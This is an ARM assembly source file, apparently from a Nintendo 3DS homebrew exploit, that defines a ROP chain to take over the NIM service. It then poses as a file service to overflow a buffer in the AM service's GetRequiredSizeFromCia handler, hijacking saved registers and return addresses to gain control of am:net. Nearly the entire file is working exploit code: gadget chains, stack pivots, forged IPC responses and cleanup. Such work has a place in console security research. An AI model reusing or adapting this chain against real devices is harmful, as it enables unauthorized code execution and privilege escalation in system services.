	.arm
	.section .rodata.NIM_ROP_Service, "a"
	.p2align 4
	#include "nim_rop.h"
	#include "am_rop.h"
	#define ROP_ABSTRACT_ADDR(x) (ROP_SERVICE_TAKEOVER_ADDR + ((x) - NIMS_0x5E_ROP_TakeOver))
	.altmacro

	@ if *DPtr1 == *DPtr2 continue else jump to FailPivot
	.macro WordPtrsCMP_PIVOT_FAIL DPtr1:req, DPtr2:req, FailPivot:req
	.word ROP_POPR0PC @ pc
	.word ROP_STACK_PIVOTBUF_ADDR(ROP_ABSTRACT_ADDR(1f)) @ r0
	.word ROP_STACK_PIVOT @ pivot
	@ pivot data
	1:
	.word \DPtr1 @ r1
	.word 0 @ r2
	.word 0 @ r3
	.word 0 @ r12
	.word ROP_ABSTRACT_ADDR(1f) @ sp - right after pivot
	.word ROP_POPR1R2R3PC @ lr
	.word ROP_POPR0PC @ pc
	@ pivot data end
	1:
	.word \DPtr2 @ r0
	.word ROP_WORDPTRDERFS_CMP_BXLR @ pc
	.word 0 @ r1
	.word 4 @ r2
	.word 0 @ r3
	.word ROP_LMUL_POPPC @ pc
	.word ROP_POPR4R5R6PC @ pc
	1:
	.word ROP_STACK_PIVOTBUF_ADDR(\FailPivot\()) @ r4 / fail
	.word ROP_STACK_PIVOTBUF_ADDR(ROP_ABSTRACT_ADDR(1f)) @ r5 / pass
	.word ROP_ABSTRACT_ADDR(1b) @ r6
	.word ROP_POPR1PC @ pc
	.word ROP_STACK_PIVOT @ r1
	.word ROP_LDR_R0FROMR0R6_BLXR1 @ pc
	@ pivot data
	1:
	.word 0 @ r1
	.word 0 @ r2
	.word 0 @ r3
	.word 0 @ r12
	.word ROP_ABSTRACT_ADDR(1f) @ sp - right after pivot
	.word 0 @ lr
	.word ROP_POPPC @ pc
	@ pivot data end
	1:
	.endm

	.macro svcReplyAndReceive_NIMS_Handle
	.word ROP_POPR0PC @ pc
	.word ROP_NIMS_SESSION_HANDLE_ADDR @ r0
	.word ROP_LDR_R0FROMR0_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	.word ROP_POPR1PC @ pc
	.word ROP_ABSTRACT_ADDR(2f) @ r1 - pivot data r3
	.word ROP_STR_R0TOR1_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	.word ROP_POPR0PC @ pc
	.word ROP_STACK_PIVOTBUF_ADDR(ROP_ABSTRACT_ADDR(1f)) @ r0
	.word ROP_STACK_PIVOT @ pivot
	@ pivot data for svcReplyAndReceive calling
	1:
	.word ROP_NIMS_SESSION_HANDLE_ADDR @ r1
	.word 1 @ r2
	2:
	.word 0xBEEFBEEF @ r3
	.word 0 @ r12
	.word ROP_ABSTRACT_ADDR(1f) @ sp - right after pivot
	.word ROP_POPR1PC @ lr
	.word ROP_POPR0PC @ pc
	1:
	@ pivot data end
	.word ROP_ABSTRACT_ADDR(.LSVC0x4F_indextmp) @ r0
	.word ROP_SVCREPLYANDRECEIVE_SKIPPUSH @ pc
	.word ROP_ABSTRACT_ADDR(.LSVC0x4F_indextmp) @ popped by svcReplyAndReceive, stores &index
	.word ROP_ABSTRACT_ADDR(.LSVC0x4F_resulttmp) @ r1
	.word ROP_STR_R0TOR1_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LSVC0x4F_resulttmp), ROP_ABSTRACT_ADDR(.LComparable_zero), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LSVC0x4F_indextmp), ROP_ABSTRACT_ADDR(.LComparable_zero), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
	.endm

	.macro Copy_From_TlsCMDBuf dest:req, len:req
	.word ROP_POPR0PC @ pc
	.word ROP_ABSTRACT_ADDR(.LTLS_CMD_Addr) @ r0
	.word ROP_LDR_R0FROMR0_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	.word ROP_POPR1R2R3PC @ pc
	.word ROP_ABSTRACT_ADDR(1f) @ r1 - r1 arg fix up
	.word \len @ r2
	.word ROP_GARBAGE @ r3
	.word ROP_STR_R0TOR1_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	.word ROP_POPR1PC @ pc
	1:
	.word 0xBEEFBEEF @ r1
	.word ROP_POPR0PC @ pc
	.word \dest @ r0
	.word ROP_MEMCPY_POPR0PC @ bl memcpy, pop {r0, pc}
	.word ROP_GARBAGE @ r0
	.endm

	.macro Copy_To_TlsCMDBuf src:req, len:req
	.word ROP_POPR0PC @ pc
	.word ROP_ABSTRACT_ADDR(.LTLS_CMD_Addr) @ r0
	.word ROP_LDR_R0FROMR0_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	.word ROP_POPR1R2R3PC @ pc
	.word \src @ r1
	.word \len @ r2
	.word ROP_GARBAGE @ r3
	.word ROP_MEMCPY_POPR0PC @ bl memcpy, pop {r0, pc}
	.word ROP_GARBAGE @ r0
	.endm

	.global NIMS_0x5E_ROP_TakeOver
NIMS_0x5E_ROP_TakeOver:
	@ This rop is for am:net instances specifically, with AM:GetRequiredSizeFromCia
	@ Define AM_U_TARGET before am_rop.h include for am:u
	@ original buffer is 0x400 bytes long
	@ corrupt an extra 0x28 and we corrupt r4, r5, r6, r7 and lr regs saved in stack along with it
	@ this rop also is meant to work at any address positioning of itself
.Lam_rop_section_start:
	.word 0 @ r4
	.word 0 @ r5
	.word AM_ROP_POPR2R3R4PC @ r6
	.word 0 @ r7
	.word AM_ROP_MOVR1SP_BLXR6 @ pc
	.word .Lam_rop_section_end - . + 0x218 + 0x20 @ r2 - getting relative offset of obj ptr to clean
	.word 0 @ r3
	.word 0 @ r4
	.word AM_ROP_LDRR1_R1R2_POPR4R5R6PC @ pc
	.word 0 @ r4
	.word 0 @ r5
	.word 0 @ r6
	.word AM_ROP_MOVR0R1_POPR1R2R3R4R5R6R7PC @ pc
	.word 0 @ r1
	.word 0 @ r2
	.word 0 @ r3
	.word 0 @ r4
	.word 0 @ r5
	.word 0 @ r6
	.word 0 @ r7
	.word AM_ROP_FILESTREAMDESCTRUCT_POPR4PC @ pc
	.word AM_ROP_PXIAM9_HANDLE_ADDR @ r4
	.word AM_ROP_MOVR0R4_POPR4PC @ pc
	.word 0 @ r4
	.word AM_ROP_POPR1R2R3PC @ pc
	.word AM_ROP_POPR1R2R3PC @ r1
	.word 0 @ r2
	.word AM_ROP_GETTLSADDR_ADD0X5C_POPR4PC @ r3 - to set lr for ROP_LDRR2_R1_LDRR3_R0_SPOILR0_BXLR
	.word AM_ROP_MOVLRR3_BXR1 @ pc
	.word AM_ROP_PXIAM9_HANDLE_ADDR @ r1
	.word 0 @ r2
	.word 0 @ r3
	.word AM_ROP_LDRR2_R1_LDRR3_R0_SPOILR0_BXLR @ pc
	.word 0 @ r4
	.word AM_ROP_POPR1PC @ pc
	.word 0x24 + 0xC @ r1
	.word AM_ROP_STRR3_R0R1_POPR4R5PC @ pc
	.word 0 @ r4
	.word 0 @ r5
	.word AM_ROP_POPR1R2R3PC @ pc
	.word 0x24 + 0x8 @ r1
	.word 0 @ r2
	.word IPC_Desc_SharedHandles(1) @ r3
	.word AM_ROP_STRR3_R0R1_POPR4R5PC @ pc
	.word 0 @ r4
	.word 0 @ r5
	.word AM_ROP_POPR1R2R3PC @ pc
	.word 0x24 + 0x4 @ r1
	.word 0 @ r2
	.word 0x0 @ r3 - result 0
	.word AM_ROP_STRR3_R0R1_POPR4R5PC @ pc
	.word 0 @ r4
	.word 0 @ r5
	.word AM_ROP_POPR1R2R3PC @ pc
	.word 0x24 + 0x0 @ r1
	.word 0 @ r2
	.word IPC_MakeHeader(0x40D, 1, 2) @ r3
	.word AM_ROP_STRR3_R0R1_POPR4R5PC @ pc
	.word .Lam_rop_section_end - 1f + 0x218 + 0x78 + 0x30 + AM_ROP_STACK_FIXUP @ r4 - enough to recover to a pop {r4-r7,pc}, where it will return and respond to us
	.word 0 @ r5
	.word AM_ROP_ADDSPR4_POPR4R5R6R7PC @ pc
	1: // after this, we dont run more of the rop, but still need padding
	.fill 0x414 - (. - .Lam_rop_section_start), 1, 0
	.word .Lam_rop_section_start - .Lam_rop_section_end @ r4
	.word 0 @ r5
	.word 0 @ r6
	.word 0 @ r7
	.word AM_ROP_ADDSPR4_POPR4R5R6R7PC @ pc
.Lam_rop_section_end:
	.fill 4096 - (.Lam_rop_section_end - .Lam_rop_section_start), 1, 0
	@ at this point, its our rop service
	@ this is a linear service, expecting specific order of commands
	@ first lets get tls cmd address and safe it to be easier
	.word ROP_GETTLSADDR_ADD0X5C_POPR4PC @ thumb get tls pointer+0x5C to r0, pop {r4, pc}
	.word ROP_GARBAGE @ r4
	.word ROP_ADDR0_0X10_POPR4PC @ thumb add r0, #0x10 and pop {r4,pc}
	.word ROP_GARBAGE @ r4
	.word ROP_ADDR0_0X10_POPR4PC @ thumb add r0, #0x10 and pop {r4,pc}
	.word ROP_GARBAGE @ r4
	.word ROP_ADDR0_0X4_POPR4PC @ thumb add r0, #4 and pop {r4,pc}
	.word ROP_GARBAGE @ r4
	.word ROP_POPR1PC @ pc
	.word ROP_ABSTRACT_ADDR(.LTLS_CMD_Addr) @ r1
	.word ROP_STR_R0TOR1_POPR4PC @ pc
	@ restore original static buf
	.word ROP_STATICBUF_DESCINDEX0 @ r4
	.word ROP_POPR1R2R3PC @ POP {R1-R3, PC}
	.word ROP_GARBAGE @ r1
	.word 0x104 @ r2  0x184 - 0x80
	.word ROP_GARBAGE @ r3
	.word ROP_STR_R4TOR2R0_POPR4PC @ str r4, [r2,r0] and pop {r4,pc}
	.word IPC_Desc_StaticBuffer(0x40, 0) @ r4
	.word ROP_POPR1R2R3PC @ POP {R1-R3, PC}
	.word ROP_GARBAGE @ r1
	.word 0x100 @ r2  0x180 - 0x80
	.word ROP_GARBAGE @ r3
	.word ROP_STR_R4TOR2R0_POPR4PC @ str r4, [r2,r0] and pop {r4,pc}
	@ now we reply back so we can proceed in the user app side
	.word ROP_GARBAGE @ r4
	.word ROP_POPR1R2R3PC @ POP {R1-R3, PC}
	.word ROP_ABSTRACT_ADDR(.LNIM_0x5E_Response) @ r1
	.word .LNIM_0x5E_Response_end - .LNIM_0x5E_Response @ r2
	.word ROP_GARBAGE @ r3
	.word ROP_MEMCPY_POPR0PC @ bl memcpy, pop {r0, pc}
	.word ROP_GARBAGE @ r0
	svcReplyAndReceive_NIMS_Handle
	@ expecting cmd 0x804
	Copy_From_TlsCMDBuf ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace), 0x100
	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace), ROP_ABSTRACT_ADDR(.LFSFile_GetSizeHeader), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
	Copy_To_TlsCMDBuf ROP_ABSTRACT_ADDR(.LFSFile_GetSize_Response), (.LFSFile_GetSize_Response_end - .LFSFile_GetSize_Response)
	svcReplyAndReceive_NIMS_Handle
	@ expecting cmd 0x802 and size requested 32 bytes for Cia header read
	Copy_From_TlsCMDBuf ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace), 0x100
	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace), ROP_ABSTRACT_ADDR(.LFSFile_ReadHeader), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace + 4*4), ROP_ABSTRACT_ADDR(.LFSFile_CiaHeaderDescBuf), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
	.word ROP_POPR0PC @ pc
	.word ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace + 4*5) @ r0
	.word ROP_LDR_R0FROMR0_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	.word ROP_POPR1PC @ pc
	.word ROP_ABSTRACT_ADDR(.LFSFile_Read_CIAHeader_Response + 4*4) @ r1
	.word ROP_STR_R0TOR1_POPR4PC
	.word ROP_GARBAGE @ pc
	.word ROP_POPR1R2R3PC @ pc
	.word ROP_ABSTRACT_ADDR(.LDummyCiaHeader) @ r1
	.word 32 @ r2
	.word ROP_GARBAGE @ r3
	.word ROP_MEMCPY_POPR0PC @ pc
	.word ROP_GARBAGE @ r0
	Copy_To_TlsCMDBuf ROP_ABSTRACT_ADDR(.LFSFile_Read_CIAHeader_Response), (.LFSFile_Read_CIAHeader_Response_end - .LFSFile_Read_CIAHeader_Response)
	@ we reply and wait now for 0x400 buffer read and ipctakeover AM
	svcReplyAndReceive_NIMS_Handle
	Copy_From_TlsCMDBuf ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace), 0x100
	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace), ROP_ABSTRACT_ADDR(.LFSFile_ReadHeader), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace + 4*4), ROP_ABSTRACT_ADDR(.LFSFile_PwnTargetDescBuf), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
	@ using ipc given buffer addr and determine the page count of 1 or 2 (should not be more)
	@ pointer to ipc buf is not aligned to page alignment (0x1000)
	@ and its no more than two given that the original size requested was 0x400
	@ pointed memory for desc_buffer on ipc response gets unmapped at the response
	@ but if i point to an arbitrary address, this gets unmapped and the ipc given memory is not
	@ so instead i'll reuse the memory given to me in a way i know it's safe for me to do so
	@ this way i make this rop even cleaner, not leaving any memory mappings behind
	.word ROP_POPR0PC @ pc
	.word ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace + 4*5) @ r0
	.word ROP_LDR_R0FROMR0_POPR4PC @ pc
	.word 0x400 @ r4
	.word ROP_POPR1R2R3PC @ pc
.LTmp1:
	.word ROP_GARBAGE @ r1
	.word ROP_GARBAGE @ r2
	.word ROP_ABSTRACT_ADDR(.LTmp1) @ r3
	.word ROP_ADDR0_R4_STR_R0TOR3_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	.word ROP_POPR1R2R3PC @ pc
	.word 12 @ r1
	.word 32 - 12 @ r2
	.word ROP_GARBAGE @ r3
	.word ROP_GET_R0_BIT_CHUNK_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	.word ROP_POPR1PC @ pc
	.word ROP_ABSTRACT_ADDR(.LTmp1) @ r1
	.word ROP_STR_R0TOR1_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	.word ROP_POPR0PC @ pc
	.word ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace + 4*5) @ r0
	.word ROP_LDR_R0FROMR0_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	.word ROP_POPR1R2R3PC @ pc
	.word 12 @ r1
	.word 32 - 12 @ r2
	.word ROP_GARBAGE @ r3
	.word ROP_GET_R0_BIT_CHUNK_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	.word ROP_POPR1PC @ pc
	.word ROP_ABSTRACT_ADDR(.LTmp2) @ r1
	.word ROP_STR_R0TOR1_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LTmp1), ROP_ABSTRACT_ADDR(.LTmp2), ROP_ABSTRACT_ADDR(.LMultiPageDescBuf)
	@ single page ipc buf
	@ use ipc_desc_buf_addr & 0xFFFFF000
	.word ROP_POPR0PC @ pc
.LTmp2:
	.word 0xBEEFBEEF @ r0
	.word ROP_POPR1R2R3PC @ pc
	.word 0 @ r1
	.word 0x1000 @ r2
	.word 0 @ r3
	.word ROP_LMUL_POPPC @ pc
	.word ROP_POPR1PC @ pc
	.word ROP_ABSTRACT_ADDR(.LFSFile_Read_PWD_Response + 4*4) @ r1
	.word ROP_STR_R0TOR1_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	.word ROP_POPR1R2R3PC @ pc
	.word ROP_ABSTRACT_ADDR(.Lam_rop_section_start) @ r1
	.word (.Lam_rop_section_end - .Lam_rop_section_start) @ r2
	.word ROP_GARBAGE @ r3
	.word ROP_MEMCPY_POPR0PC @ pc
	.word ROP_STACK_PIVOTBUF_ADDR(ROP_ABSTRACT_ADDR(1f)) @ r0
	.word ROP_STACK_PIVOT @ pc
	1:
	.word 0 @ r1
	.word 0 @ r2
	.word 0 @ r3
	.word 0 @ r12
	.word ROP_ABSTRACT_ADDR(2f) @ sp
	.word 0 @ lr
	.word ROP_POPPC @ pc
	@ multi page ipc buf
	@ use ipc_desc_buf_addr as is
	@ we write more than the original 0x400 bytes but no more than 0x1000 so its fine
.LMultiPageDescBuf:
	.word ROP_POPR0PC @ pc
	.word ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace + 4*5) @ r0
	.word ROP_LDR_R0FROMR0_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	.word ROP_POPR1PC @ pc
	.word ROP_ABSTRACT_ADDR(.LFSFile_Read_PWD_Response + 4*4) @ r1
	.word ROP_STR_R0TOR1_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	.word ROP_POPR1R2R3PC @ pc
	.word ROP_ABSTRACT_ADDR(.Lam_rop_section_start) @ r1
	.word (.Lam_rop_section_end - .Lam_rop_section_start) @ r2
	.word ROP_GARBAGE @ r3
	.word ROP_MEMCPY_POPR0PC @ pc
	.word ROP_GARBAGE @ r0
	2:
	Copy_To_TlsCMDBuf ROP_ABSTRACT_ADDR(.LFSFile_Read_PWD_Response), (.LFSFile_Read_PWD_Response_end - .LFSFile_Read_PWD_Response)
	@ we get a close command, good
	svcReplyAndReceive_NIMS_Handle
	Copy_From_TlsCMDBuf ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace), 0x100
	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace), ROP_ABSTRACT_ADDR(.LFSFile_CloseHeader), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
	Copy_To_TlsCMDBuf ROP_ABSTRACT_ADDR(.LFSFile_Close_Response), (.LFSFile_Close_Response_end - .LFSFile_Close_Response)
	@ now we load the recovery payload
	.word ROP_POPR0PC @ pc
	.word ROP_STATICBUF_DESCINDEX2 @ r0
	.word ROP_POPR1R2R3PC @ pc
	.word ROP_ABSTRACT_ADDR(.LROP_Service_Restore) @ r1
	.word .LROP_Service_Restore_end - .LROP_Service_Restore @ r2
	.word ROP_GARBAGE @ r3
	.word ROP_MEMCPY_POPR0PC @ pc
	.word ROP_STACK_PIVOTBUF_ADDR(ROP_ABSTRACT_ADDR(1f)) @ r0 - stack pivot data
	.word ROP_STACK_PIVOT @ going back to flow
	1:
	@ pivot data
	.word 0 @ r1
	.word 0 @ r2
	.word 0 @ r3
	.word 0 @ r12
	.word ROP_STATICBUF_DESCINDEX2 @ sp
	.word 0 @ lr
	.word ROP_POPPC @ pc

	@temp work space and prebuilt values
.LTLS_CMD_Addr:
	.word 0

.LSVC0x4F_indextmp:
	.word 0
.LSVC0x4F_resulttmp:
	.word 0

.LComparable_zero:
	.word 0

.LFSFile_GetSizeHeader:
	.word IPC_MakeHeader(0x804, 0, 0)
.LFSFile_ReadHeader:
	.word IPC_MakeHeader(0x802, 3, 2)
.LFSFile_CloseHeader:
	.word IPC_MakeHeader(0x808, 0, 0)

.LFSFile_CiaHeaderDescBuf:
	.word IPC_Desc_Buffer(32, IPC_BUFFER_W)

.LFSFile_PwnTargetDescBuf:
	.word IPC_Desc_Buffer(0x400, IPC_BUFFER_W)

.LFSFile_GetSize_Response:
	.word IPC_MakeHeader(0x804, 3, 0)
	.word 0
	.word 0x100
	.word 0
.LFSFile_GetSize_Response_end:

.LFSFile_Read_CIAHeader_Response:
	.word IPC_MakeHeader(0x802, 2, 2)
	.word 0
	.word 32
	.word IPC_Desc_Buffer(32, IPC_BUFFER_W)
	.word 0xBEEFBEEF
.LFSFile_Read_CIAHeader_Response_end:

.LFSFile_Read_PWD_Response:
	.word IPC_MakeHeader(0x802, 2, 2)
	.word 0xE0C046F8
	.word (.Lam_rop_section_end - .Lam_rop_section_start)
	.word IPC_Desc_Buffer((.Lam_rop_section_end - .Lam_rop_section_start), IPC_BUFFER_W)
	.word 0xBEEFBEEF
.LFSFile_Read_PWD_Response_end:

.LFSFile_Close_Response:
	.word IPC_MakeHeader(0x808, 1, 0)
	.word 0
.LFSFile_Close_Response_end:

.LDummyCiaHeader:
	.word 0x2020
	.word 0
	.word 0xA00
	.word 0x350
	.word 0xb64
	.word 0x0
	.word 0x100000
	.word 0x0

.LNIM_0x5E_Response:
	.word IPC_MakeHeader(0x5e, 2, 0)
	.word 0
	.word 0
.LNIM_0x5E_Response_end:

.LCMDBUF_WorkSpace:
	.fill 0x40, 4, 0

.LPivot_Critical_Failed:
	.word 0 @ r1
	.word 0 @ r2
	.word 0 @ r3
	.word 0 @ r12
	.word ROP_ABSTRACT_ADDR(1f) @ sp - right after pivot
	.word ROP_POPR0PC @ lr
	.word ROP_POPR0PC @ pc
	1:
	.word 0 @ r0 - USERBREAK_PANIC
	.word ROP_SVCBREAK @ pc
	@ shouldn't return, but just in case
	.word ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed) @ r0
	.word ROP_STACK_PIVOT @ pc

	#define ROP_RECOVERY_ABSTRACT_ADDR(x) (ROP_STATICBUF_DESCINDEX2 + ((x) - .LROP_Service_Restore))
.LROP_Service_Restore:
	.word ROP_POPR0PC @ pc
	.word ROP_STACK_PIVOTBUF_ADDR(ROP_RECOVERY_ABSTRACT_ADDR(1f)) @ r0
	.word ROP_STACK_PIVOT @ pc
	1:
	.word ROP_SERVICE_TAKEOVER_ADDR @ r1
	.word 0 @ r2
	.word ROP_SERVICE_TAKEOVER_SIZE @ r3
	.word 0 @ r12
	.word ROP_RECOVERY_ABSTRACT_ADDR(1f) @ sp - right after pivot
	.word ROP_POPR4R5PC @ lr - hop over stack args
	.word ROP_SVCCONTROLMEMORY_SKIPPUSH @ pc
	1:
	.word ROP_RECOVERY_ABSTRACT_ADDR(1b) @ r0 - garbage pointer
	.word ROP_GARBAGE @ r4
	.word 1 @ stack arg 1
	.word 0 @ stack arg 2
	.word ROP_POPR0PC @ pc
	.word ROP_STACK_PIVOTBUF_ADDR(ROP_RECOVERY_ABSTRACT_ADDR(1f)) @ r0 - stack pivot data
	.word ROP_STACK_PIVOT @ going back to flow
	@ pivot data
	1:
	.word 0 @ r1
	.word 0 @ r2
	.word 0 @ r3
	.word 0 @ r12
	.word ROP_STACK_RECOVER_ADDR @ sp
	.word 0 @ lr
	.word ROP_POPR4R5R6R7PC @ pc
.LROP_Service_Restore_end:
.LNIMS_0x5E_ROP_TakeOver_end:
	.size NIMS_0x5E_ROP_TakeOver, .-NIMS_0x5E_ROP_TakeOver

	.section .rodata.NIM_ROP_Service_size, "a"

	.global NIMS_0x5E_ROP_TakeOver_size
NIMS_0x5E_ROP_TakeOver_size:
	.word .LNIMS_0x5E_ROP_TakeOver_end - NIMS_0x5E_ROP_TakeOver
	.size NIMS_0x5E_ROP_TakeOver_size, .-NIMS_0x5E_ROP_TakeOver_size
